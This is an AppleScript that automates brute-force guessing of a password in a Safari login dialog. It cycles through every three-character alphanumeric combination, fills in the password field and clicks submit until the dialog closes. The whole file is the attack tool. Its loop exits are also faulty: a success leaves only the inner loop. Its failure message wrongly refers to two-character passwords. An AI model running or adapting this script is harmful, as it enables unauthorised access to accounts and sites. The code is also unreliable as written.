set charlist to ({} as list)
repeat with x from 48 to 57
	set charlist to (charlist & (ASCII character of x) as list)
end repeat
repeat with x from 65 to 90
	set charlist to (charlist & (ASCII character of x) as list)
end repeat
repeat with x from 97 to 122
	set charlist to (charlist & (ASCII character of x) as list)
end repeat

tell application "Safari" to activate
delay 2
tell application "System Events"
	set base to ""
	set pword to ""
	set foundpass to false
	repeat with a from 1 to 62
		--set base to (item a of charlist)
		repeat with b from 1 to 62
			--set base to base & (item b of charlist)
			repeat with c from 1 to 62
				set pword to (item a of charlist) & (item b of charlist) & (item c of charlist)
				set value of text field 2 of sheet 1 of window 1 of application process "Safari" to pword
				click button 1 of sheet 1 of window 1 of application process "Safari"
				delay 1
				if ((sheet 1 of window 1 of application process "Safari") exists) is false then
					set foundpass to true
					exit repeat
					exit repeat
					exit repeat
				end if
			end repeat
		end repeat
	end repeat
end tell
tell application "Safari"
	if foundpass is true then
		display dialog "Found password!  Password is " & pword & "."
	else
		display dialog "Password not found with 2 characters...Try 3..."
	end if
end tell